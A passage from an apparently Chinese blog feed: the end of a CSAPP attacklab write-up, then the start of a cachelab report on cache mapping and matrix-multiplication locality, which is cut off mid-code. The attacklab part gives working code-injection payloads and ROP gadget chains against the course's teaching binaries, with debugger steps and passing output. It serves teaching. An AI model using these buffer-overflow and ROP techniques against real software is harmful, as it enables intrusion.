code），并填充中间部分（pad），最后把返回地址 A 重写为缓冲区起始位置（B）。这样以来，程序在执行到 Q 中的 <code>return</code> 后，就不是回到 P 中继续执行原本的逻辑，而是开始执行黑客注入的恶意代码。</p>
<p>为了抵抗这种攻击，新的代码可以使用 <code>fgets</code> 这种带有边界检查的函数，而旧代码可以通过以下机制：</p>
<ul>
<li>栈随机偏移：每次执行都随机初始化栈的起始地址的偏移量，使得固定地址的溢出攻击失效</li>
<li>系统级保护：将栈标记为不可执行的，只有代码区可执行</li>
<li> Stack
Canary：在缓冲区后放置随机的特殊值（canary），检查读入前后是否被污染</li>
</ul>
<h3 id="面向返回编程">面向返回编程</h3>
<p>栈随机偏移和系统级保护都有一定的作用，但不是无懈可击的。面向返回编程攻击（Return-Oriented
Programming
Attacks）的思想是，在代码区找到以 <code>c3</code>(<code>ret</code> 指令）结尾的可执行的字节序列（gadgets），将它们填充到栈上。然后，程序在执行 <code>ret</code> 指令时，会弹出栈上地址并跳转执行，执行到下一个 <code>ret</code>，重复这个过程，就把所有的 gadget 串成了一条链，实现了执行自定义逻辑的行为。如下所示：</p>
<p>[rop.png]</p>
<p>这依赖于黑客在代码区找到有用的 gadget，组装出自定义逻辑。</p>
<h2 id="code-injection">Code Injection</h2>
<h3 id="phase-1">phase 1</h3>
<p>基础的练习题目，不需要注入新的代码，只需要注入跳转地址，跳转到 <code>touch1</code> 即可。通过 <code>objdump
-d</code> 对 <code>ctarget</code> 进行反汇编，可以看到 <code>touch1</code> 的起始地址为 <code>0x4017c0</code>。pdf 中介绍主函数为如下的 <code>test</code> 函数，通过 <code>getbuf-&gt;Gets</code> 完成字符串读入，<code>Gets</code> 的行为与标准库 <code>gets</code> 类似，因此我们的重点在 <code>getbuf</code> 函数。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><code>getbuf</code> 反汇编如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到，<code>getbuf</code> 申请了 0x28=40
bytes 的栈空间，并把地址作为 <code>Gets</code> 函数的参数。进一步参考上面的这张图片</p>
<p><img src="code_injection.png"></p>
<p>对应可得，应该填充 40 个任意字节（不能包含换行符 0x0a），再填入缓冲区的起始地址，就可以在 <code>getbuf</code> 的 <code>retq</code> 执行完毕后，执行缓冲区逻辑。为了获取缓冲区起始地址，可以按如下步骤：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gdb ./ctarget <span class="comment"># 调试启动</span></span><br><span class="line"><span class="built_in">break</span> getbuf <span class="comment"># 打断点</span></span><br><span class="line">run -q <span class="comment"># 离线启动</span></span><br><span class="line">stepi <span class="comment"># 运行一步到 0x4017ac</span></span><br><span class="line"><span class="built_in">print</span> /x <span class="variable">$rsp</span> <span class="comment"># 十六进制打印栈地址</span></span><br></pre></td></tr></tbody></table></figure>
<p>可得，结果是 <code>0x5561dc78</code>。那么，就可以设计如下的攻击字节序列：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<p>在 5*8=40 个填充字节后，以小端逆序存放缓冲区地址。通过下面的命令验证结果，发现攻击成功。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./hex2raw &lt; ctarget.l1.txt | ./ctarget  -q                                                                                                                                                                                                                 </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<h3 id="phase-2">phase 2</h3>
<p>本节要求跳转到 <code>touch2</code> 函数（地址 0x4017ec），该函数需要传入 cookie 作为参数才能验证成功。因此，需要注入汇编代码，完成传参过程。可以写出如下的汇编代码。注意这里不能直接使用 <code>call</code> 指令，无法单独完成汇编过程。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></tbody></table></figure>
<p>% rdi 是 x86 规范的存储第一个入参的寄存器，<code>pushq+retq</code> 联合完成跳转到 <code>touch2</code> 的过程。按如下命令得到对应的机器码：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gcc -c cl2.s</span><br><span class="line">objdump -d cl2.o &gt; cl2.d</span><br></pre></td></tr></tbody></table></figure>
<p>可以发现结果是</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line">cl3.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi</span><br><span class="line">   7:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">   c:	c3                   	retq   </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>注意，大小端是对数值存储来说的，指令不需要做逆序处理。填充可以得到如下的结果：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">68 ec 17 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<p>验证可以发现通过测试。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./hex2raw &lt; ctarget.l2.txt  | ./ctarget  -q                                                                                                                                                                                                                </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<h3 id="phase-3">phase 3</h3>
<p>与 phase
2 类似，区别在于要传入 16 进制的 cookie 字符串作为参数，才能匹配。字符串存储在哪里呢？如果存储在 <code>getbuf</code> 函数的栈上（即缓冲区里），随着 <code>getbuf</code> 执行 <code>add    $0x28,%rsp</code>，栈空间会被释放，而 <code>touch3,hexmatch</code> 的新数据会覆盖这部分栈空间，导致数据被污染，因此，不能存储在这里。</p>
<p>所以，我们需要把字符串存储在不会被后续执行覆盖的位置，简单起见，可以存储在 <code>test</code> 函数的栈上，因为 <code>test</code> 函数一直没有返回，栈空间持续有效。接下来，构建 cookie 字符串，可以查 ascii 表逐字符地填写 16 进制 ascii 值，本文的 cookie 是 0x59b997fa，查表结果为 <code>35
39 62 39 39 37 66 61</code>。同样的，这里也不需要小端逆序。</p>
<p>接下来，编写汇编完成传参过程，字符串基址取决于存储的位置。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">movq $0x5561dca8,%rdi # cookie字符串基址</span><br><span class="line">pushq $0x4018fa # touch3 地址</span><br><span class="line">retq</span><br></pre></td></tr></tbody></table></figure>
<p>可以构建出如下的攻击字节序列，<code>78 dc 61 55 00 00 00
00</code> 这一行是缓冲区基址，与前面类似。下一行存储了 cookie 字符串，地址可以由 0x5561dc78+0x28（缓冲区大小）+0x8（返回值大小）=0x5561dca8 计算得到。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line">68 fa 18 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<p>验证可得，通过测试。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">❯ ./hex2raw &lt; ctarget.l3.txt   | ./ctarget  -q                                                                                                                                                                                                               </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3("59b997fa")</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<h2 id="rop">ROP</h2>
<p>这部分就启用了栈随机偏移和栈不可执行的系统防护，只能通过面向返回编程的角度进行攻击。</p>
<h3 id="phase-4">phase 4</h3>
<p>要实现 phase
2 的效果，提示可以用两个 gadget 实现。要完成目标，我们需要做以下步骤：</p>
<ol type="1">
<li>将 cookie 赋值给 % rdi</li>
<li> 跳转到 touch2</li>
</ol>
<p>其中，第 2 步只需要在栈里放置 touch2 的地址，等到上一个 gadget
ret 时会自动完成跳转，不需要 gadget。步骤 1 中，由于 cookie 是自定义的，farm 中很难正好有一步到位的 gadget 可以将 cookie 赋给 % rdi（至少我这个 cookie 没有），因此需要拆分多个 gadget 实现。不难想到，可以先把 cookie 放在栈上，pop 到某个寄存器上，再 mov 给 % rdi，就可实现。</p>
<p>查看后文的表格，可以发现 0x58-0x5f 都是 popq 指令，从 start_farm 开始看汇编，发现 <code>addval_219</code> 满足要求：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3 </span><br></pre></td></tr></tbody></table></figure>
<p>其中，90 是 nop 指令，无影响。我们就找到了 0x4019ab 的 gadget1，作用是 <code>popq
%rax</code>。接下来，需要找 <code>movq %rax,
%rdi</code> 的 gadget，查表可得指令为 <code>48 89
c7</code>，发现 <code>addval_273</code> 函数中满足要求：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3    </span><br></pre></td></tr></tbody></table></figure>
<p>0x4019a2 的 gadget2，就可以完成上述 mov 操作。接下来，需要构造攻击字符串。这里需要关注指令在堆里的顺序，分析可得程序的行为应该是：</p>
<ol type="1">
<li><code>getbuf</code> 执行完毕，释放栈空间</li>
<li><code>retq</code> 跳转到 gadget1</li>
<li> 从栈上 pop 出 cookie</li>
<li><code>retq</code> 到 gadget2</li>
<li><code>movq</code></li>
<li><code>retq</code> 到 touch2</li>
</ol>
<p><code>getbuf</code> 之后的 <code>ret</code>，<code>pop</code> 均是以 <code>test</code> 的栈为基准的（因为 <code>getbuf</code> 的栈已经释放），所以后续指令都得覆盖在 <code>test</code> 栈上。进而可以构造出以下攻击序列：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<p>填充 40 个空字节后，先跳转到 gadget1（第六行），栈指针移动到第七行，然后 <code>popq</code> 弹出 cookie，栈指针移动到第八行，跳转到 gadget2，移动到第九行，最后跳转到 touch2。最后进行运行验证：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 </span><br></pre></td></tr></tbody></table></figure>
<h3 id="phase-5">phase 5</h3>
<p>这个 phase 要使用 rop 达到 phase
3 的效果，课程组刻意把这个 phase 做的很难，而且只占 5 分，留作奖励，官方解答用了 8 个 gadget。</p>
<p>不妨先从 farm 分析下有哪些指令可以使用（有效的 gadget），发现有：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">movq %rax,%rdi # 48 89 c7  0x4019a2</span><br><span class="line">movq %rsp,%rax # 48 89 e0  0x401a06</span><br><span class="line">popq %rax      # 58        0x4019ab</span><br><span class="line"></span><br><span class="line">popq %rsp</span><br><span class="line">movl %eax,%edx # 5c 89 c2  0x4019dc</span><br><span class="line"></span><br><span class="line">movl %eax,%edi # 89 c7     0x4019a3</span><br><span class="line">movl %eax,%edx # 89 c2     0x4019dd</span><br><span class="line">movl %esp,%eax # 89 e0     0x401a07</span><br><span class="line">movl %ecx,%esi # 89 ce     0x401a13</span><br><span class="line">movl %edx,%ecx # 89 d1     0x401a34</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>有代码意义的函数，只有一个加法函数 <code>add_xy</code>：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3   </span><br></pre></td></tr></tbody></table></figure>
<p><code>movl</code> 指令会把目标寄存器的高 4 字节置为 0。</p>
<p>乍一看好像有点尴尬。因为我们没有直接写入内存的指令，所以 cookie 字符串只能以缓冲区读入的方式写在栈上。而由于栈的随机偏移，也无法知晓固定的起始地址。但是换个角度，相对地址是可以控制的，可以通过 gadget 读取 % rsp 的值，并通过 add_xy 函数添加相对偏移，获取到字符串基址。按这个角度，核心要解决的问题有两个：</p>
<ol type="1">
<li>add_xy 怎么传参</li>
<li>相对偏移怎么确定</li>
</ol>
<p>add_xy 需要 % rdi，% rsi 两个参数，% rdi 存储栈帧，% rsi 存放相对偏移（因为只能向 % esi 赋值），数据来源均是 % rax。从上述 gadget 可以找出两条赋值路线：</p>
<ul>
<li>%rsp-&gt;%rax-&gt;%rdi</li>
<li>%rax-&gt;%edx-&gt;%ecx-&gt;%esi</li>
</ul>
<p>对应的汇编依次为：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">movq %rsp,%rax # 48 89 e0  0x401a06 </span><br><span class="line">movq %rax,%rdi # 48 89 c7  0x4019a2</span><br><span class="line">popq %rax      # 58        0x4019ab 读取偏移值</span><br><span class="line">movl %eax,%edx # 89 c2     0x4019dd</span><br><span class="line">movl %edx,%ecx # 89 d1     0x401a34</span><br><span class="line">movl %ecx,%esi # 89 ce     0x401a13</span><br><span class="line"># add_xy 0x4019d6</span><br><span class="line">movq %rax,%rdi # 48 89 c7  0x4019a2</span><br><span class="line"># touch3 0x4018fa</span><br></pre></td></tr></tbody></table></figure>
<p>把 cookie 字符串放置在这些 gadget 之后，再计算相对偏移量就可以了。构造好的攻击序列如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<p>其中的偏移值为 0x48=72 字节，这是由于在第一个 gadget 内，% rsp 处在第 7 行，cookie 字符串存储在第 16 行，二者间差了 8*9=72 个字节。成功通过验证：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3("59b997fa")</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<h2 id="总结">总结</h2>
<p>这个 lab 做起来还是很有意思的。我第一次学完相关理论知识后，有点望而生畏，觉得难度很大。等有时间了，沉下心来，发现难度其实不大，循序渐进地做下来，还是很有成就感的。正如老师在课程里说的，"成功通过这个 lab，就打开了一扇黑暗的大门"。指导书里也提到，“我们已经成功绕过了两个现代化的阻止缓冲区溢出的手段”。通过这种理论知识和实践练习，可以深度理解缓冲区溢出的风险和规避措施，进而在日常编程中提高戒心。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-4 实验报告: cachelab</title>
    <url>/blog/2023/12/17/CSAPP-Lab-4/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了笔者在做 cachelab 一节的实验报告。该 lab 要求使用 C 语言实现 cache
memory 的映射淘汰逻辑，并通过分块处理减少代码中的 cache miss。
<span id="more"></span></p>
<h2 id="理论知识">理论知识</h2>
<h3 id="cache">cache</h3>
<p>cache，即缓存，既是一种思想，也是计算机体系结构里的一块内存。前者大家很熟悉了，通过缓存耗时操作结果来降低延时，例如 redis 就是常用的缓存中间件。后者的话，处于寄存器与主存之间的高速存储，常分为 L1、L2、L3 三级，用于提供热点数据的快速访问，这也是本文 cache 的涵义。</p>
<p>cache 希望达到的目标有两个：</p>
<ul>
<li><strong>充分利用存储空间</strong>：减少不必要的 cache 淘汰，提高命中率</li>
<li><strong>快速查找</strong>：查找地址在 cache 中的速度要尽可能快，因为这是很基础的功能</li>
</ul>
<p>cache 的核心问题是，内存地址与 cache 存储间的映射关系是怎样的，常有以下几种组织形式：</p>
<ul>
<li>全相联（Fully Associative）：一个内存地址都可以存储在 cache 任意位置
<ul>
<li>优点：充分利用存储空间</li>
<li>缺点：查找效率差，O (n)，n 为 cache 条数</li>
</ul></li>
<li>直接映射（Direct
Mapped）：一个内存地址被唯一映射到 cache 固定位置，例如取模
<ul>
<li>优点：查找效率高，O (1)</li>
<li> 缺点：不能充分利用空间</li>
</ul></li>
<li>组相联（Set
Associative）：平衡两者优点，将 cache 分为若干个组，一个内存地址被唯一映射到一个组，组内全相连
<ul>
<li>优点：调整超参数（组的数量），可以取得存储和速度的均衡</li>
<li>缺点：超参数怎么调呢？</li>
</ul></li>
</ul>
<p>事实上，全相联和直接映射可以看做组相联的特例。cache 可以定义为一个三元组<span class="math inline"> \((S,E,B)\)</span>：有着<span class="math inline"> \(2^S\)</span> 个组，组内有<span class="math inline"> \(E\)</span> 条 cache，每条 cache 可以存放<span class="math inline"> \(2^B\)</span> 字节的数据。一个内存地址被拆分为标签段（tag）、组索引段（set
index）与块内偏移（block offset）三部分。如下图所示。</p>
<p><img src="set_associative.png"></p>
<p>全相联可以看做<span class="math inline"> \(S=1\)</span> 的组相联，直接映射可以看做<span class="math inline"> \(E=1\)</span> 块的组相联。块是 cache 读写数据的最小单位，这意味着程序需要读取一个字节时，例如数组元素 A [0]，加载到 cache 的不仅是 A [0] 本身，而是以 A 开始的一整个块，包含 A [0]，A [1]... 这也是我们常说的预读。如果程序访问内存的模式满足这种模式，就能取得很好的<strong>空间局部性</strong>（temporal
locality），提高缓存命中率，进而提升程序性能。反过来，如果不满足这种模式，就会损害性能。</p>
<p>一个典型的坏例子是二维数组的遍历，代码如下所示。在 C 语言中，二维数组是以行存储的一维数组。假设 cache 只能存储一个块，一个块可以包含 8 个 int，N&gt;8，下面的代码的行为是，访问 a [i][0]，加载 a [i][0]-a [i][7]，访问 a [i+1][0]，丢弃已有 cache，加载 a [i+1][0]-a [i+1][7]，访问 a [i+2][0]，丢弃已有 cache，加载 a [i+2][0]-a [i+2][7]。。。依次重复，可以看到，缓存的预读没有起到任何作用，每次读取都无法命中缓存，带来性能开销。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumarraycols</span><span class="params">(<span class="keyword">int</span> a[M][N])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, j, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i++)</span><br><span class="line">        	sum += a[i][j];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>如果交换两个循环的顺序，代码变为：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumarraycols</span><span class="params">(<span class="keyword">int</span> a[M][N])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, j, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i++)</span><br><span class="line">    	<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">        	sum += a[i][j];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>就可以很大程度提升局部性，代码的行为是，访问 a [i][0]，加载 a [i][0]-a [i][7]，访问 a [i][1]-a [i][7]，均命中缓存，访问 a [i][8]，丢弃缓存，加载 a [i][8]-a [i][15]。。。缓存命中率大大提高，由 0 变为 7/8。</p>
<h3 id="矩阵乘法的优化">矩阵乘法的优化</h3>
<p>上述思路也可以用于优化矩阵乘法。n*n 两矩阵乘法的简单代码为：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) {</span><br><span class="line">        sum = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            sum += A[i][k]*B[k][j];</span><br><span class="line">        C[i][j] += sum;</span><br><span class="line">	}</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到，A 的访问模式是满足步长为 1 的空间局部性的，缓存命中率高，而 B 的访问模式满足步长为 n 的局部性，命中率差。这里我们只关心最内层循环，假设一个块为 32
Bytes，元素为 double 占 8
Bytes，即一个块可以存储 4 个元素。那么，最内层循环中，A 的缓存失效率为 0.25，B 的缓存失效率为 1。</p>
<p>交换三层循环的顺序，可以带来缓存命中率的收益。三层循环共有 6 种顺序，上面的顺序是 ijk，将它交换为 jik 结果不变。</p>
<p>如果变为 jki 或 kj，性能会变得更差，jki 代码如下。最内层循环中，C 的缓存失效率为 1，A 的缓存失效率为 1。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++) {</span><br><span class="line">        r = B[k][j];</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        	C[i][j] += A[i][k]*r;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<p>如果变为 jki 或 kj，性能会达到最好，kij 代码如下。最内层循环中，C 的缓存失效率为 0.25，B 的缓存失效率为 0.25。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) {</span><br><span class="line">        r = A[i][k];</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        	C[i][j] += r*B[k][j];</span><br><span class="line">	}</span><br></pre></td></tr></tbody></table></figure>
<p>整理可以得到如下表格。</p>
<p><img src="matrix_multi.png"></p>
<h3 id="分块优化">分块优化</h3>
<p>上面的做法带来的命中率的提升，但仍有优化的空间。优化的思想是对矩阵进行分块，来进一步提升局部性。它的思想是尽量最大化一个块数据的用处。分析上面的代码可以发现，一个块被加载到 cache 之后，例如 B，每个元素只参与了一次运算，就会被逐出。当 C 的索引发生变化时，会再次需要加载同样的块进来，这带来了开销。根本原因在于，是在元素这个维度进行的运算，而不是块的维度。</p>
<p>代码如下所示</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bijk</span><span class="params">(<span class="built_in">array</span> A, <span class="built_in">array</span> B, <span class="built_in">array</span> C, <span class="keyword">int</span> n, <span class="keyword">int</span> bsize)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, j, k, kk, jj;</span><br><span class="line">    <span class="keyword">double</span> sum;</span><br><span class="line">    <span class="keyword">int</span> en = bsize * (n / bsize); <span class="comment">/* Amount that fits evenly into blocks */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            C[i][j] = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (kk = <span class="number">0</span>; kk &lt; en; kk += bsize)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (jj = <span 